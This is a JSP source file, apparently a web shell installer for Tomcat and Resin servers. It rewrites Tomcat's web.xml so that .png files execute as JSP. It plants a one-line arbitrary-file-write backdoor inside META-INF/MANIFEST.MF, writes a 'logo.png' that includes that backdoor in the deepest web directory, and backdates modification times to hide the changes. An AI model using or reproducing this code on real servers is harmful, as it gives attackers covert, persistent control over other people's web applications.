<%@page import="java.text.SimpleDateFormat"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.util.regex.*"%>
<%!
    private static int ab;
    private static String cd;
    private static final String mm = "<%new java.io.RandomAccessFile(application.getRealPath(\"/\")+request.getParameter(\"a\"), \"rw\").write(request.getParameter(\"b\").getBytes());%"+">";
    void editXml(HttpServletRequest request) throws Exception{
        File path  = new File("").getAbsoluteFile();
        String encode = "UTF-8";
        String serverName = request.getSession().getServletContext().getServerInfo();
        int version = 0;
        Matcher m = Pattern.compile("\\d",Pattern.CASE_INSENSITIVE).matcher(serverName);
        if(m.find()){
            version = Integer.parseInt(m.group());
        }
        if(serverName.toLowerCase().contains("tomcat")){
            editTomcatWebXml(path,encode,version);
        }else if(serverName.toLowerCase().contains("resin")){
            //editResinAppDefaultXml(path,encode,version);
        }else{
        }
    }
    String getServerPath(){
        String[] str = new String[]{"catalina.home","resin.home","jetty.home","jboss.home","BEA_HOME"};
        for(String s:str){
            if(null!=System.getProperty(s)&&new File(System.getProperty(s)).exists()){
                return System.getProperty(s).replaceAll("\\\\", "/")+"/";
            }
        }
        String dir = System.getProperty("user.dir").replaceAll("\\\\", "/")+"/";
        if(dir.endsWith("/bin")){
            dir = dir.substring(0,dir.lastIndexOf("/bin")-1);
        }
        return dir;
    }
    void editTomcatWebXml(File path,String encode,int version) throws Exception {
        File webXmlPath = new File(getServerPath()+File.separator+"conf"+File.separator+"web.xml");
        String str = readFileToString(webXmlPath,"UTF-8");
        String reg = "<url-pattern>*.png</url-pattern>";
        if(str==null||!str.contains(reg)){
        String key = "<url-pattern>*.jsp</url-pattern>";
            writeStringToFile(webXmlPath, str.replace(key, key+"\r\n"+"\t\t\t\t"+reg), encode,false);
        }
    }
    void editResinAppDefaultXml(File path,String encode,int version) throws Exception {
        if(version>3){
            /* File f = new File(getServerPath()+File.separator+"conf"+File.separator+"resin.xml");
            String str = readFileToString(f, encode);
            writeStringToFile(f, str.replace("classpath:META-INF/caucho/app-default.xml","${resin.home}/conf/app-default.xml"), encode, false);
            File c = new File(getServerPath()+File.separator+"conf"+File.separator+"cluster-default.xml");
            if(c.exists()){
                String content = readFileToString(f, encode);
                writeStringToFile(c, content.replace("classpath:META-INF/caucho/app-default.xml","${resin.home}/conf/app-default.xml"), encode, false);
            } */
            return ;
        }
        File webXmlPath = new File(getServerPath()+File.separator+"conf"+File.separator+"app-default.xml");
        String str = readFileToString(webXmlPath,"UTF-8");
        String reg = "<servlet-mapping url-pattern=\"*.png\" servlet-name=\"resin-jsp\"/>";
        String key = "<servlet-mapping url-pattern=\"*.jsp\" servlet-name=\"resin-jsp\"/>";
        if(str==null||!str.contains(reg)){
            writeStringToFile(webXmlPath, str.replace(key, key+"\r\n"+"\t"+reg), encode,false);
        }
    }
    String readFileToString(File f,String encode) throws Exception{
        StringBuilder sb = new StringBuilder();
        String str = "";
        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f),"UTF-8"));
        while((str=br.readLine())!=null){
            sb.append(str+"\r\n");
        }
        br.close();
        return sb.toString();
    }
    void writeStringToFile(File f,String content,String encode,boolean append) throws Exception{
        long lastModified = !f.exists()?new SimpleDateFormat("yyyy-mm-dd HH:mm:ss").parse("2012-03-14 12:43:11").getTime():f.lastModified();
        StringBuilder sb = new StringBuilder();
        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f,append),"UTF-8"));
        bw.write(content);
        bw.flush();
        bw.close();
        f.setLastModified(lastModified);
    }
    void getDepthPath(File file){
        if (file.isDirectory()) {
            int a = file.toString().split(File.separator).length;
            if(ab<a){
                ab = a;
                cd = file.toString();
            }
            String[] files = file.list();
            for (int i = 0; i < files.length; i++) {
                getDepthPath(new File(file, files[i]));
            }
        }
    }
    void saveFile(HttpServletRequest request,String encode) throws Exception{
        File path  = new File(request.getSession().getServletContext().getRealPath("/")+File.separator+"META-INF"+File.separator);
        if(!path.exists()){
            path.mkdirs();
        }
        String str = readFileToString(new File(path,"MANIFEST.MF"), encode);
        if(str!=null||!str.contains("RandomAccessFile")){
            writeStringToFile(new File(path,"MANIFEST.MF"), "info:"+mm,encode, true);
        }
    }
    void naughty(HttpServletRequest request) throws Exception{
        File path  = new File(request.getSession().getServletContext().getRealPath("/"));
        File[] str = path.listFiles();
        for(File s:str){
            if(s.isDirectory()&&!s.toString().contains("WEB-INF")&&!s.toString().contains("META-INF")){
                getDepthPath(s);
            }
        }
        File f = new File((cd.length()>0?cd:path.toString())+File.separator+"logo.png");
        String split = "";
        String[] sb = f.toString().replace(path.toString(), "").split("/");
        for(String q:sb){
            split +="../";
        }
        writeStringToFile(f, "<%@ include file=\"/META-INF/MANIFEST.MF\" %"+">", "UTF-8", false);
        saveFile(request, "UTF-8");
    }
    void oneLove(HttpServletRequest request) throws Exception{
        editXml(request);
        naughty(request);
    }
%>
<%
    try{
        oneLove(request);
        out.println("[/ok]<br/>"+"[path="+cd+File.separator+"logo.png]");
    }catch(Exception e){
        out.println("[error:"+e.toString()+"]");
        try{
            File ef = null;
            if(!"".equals(cd)&&new File(cd).canWrite()){
                ef = new File(cd+File.separator+"applicationContext.jsp");
            }else{
                ef = new File(application.getRealPath("/")+File.separator+"applicationContext.jsp");
            }
            out.println("[/ok]<br/>"+"[path="+ef.toString()+"]");
            writeStringToFile(ef, mm, "UTF-8", false);
        }catch(Exception x){
            out.println("[error:"+x.toString()+"]");
        }
    }
%>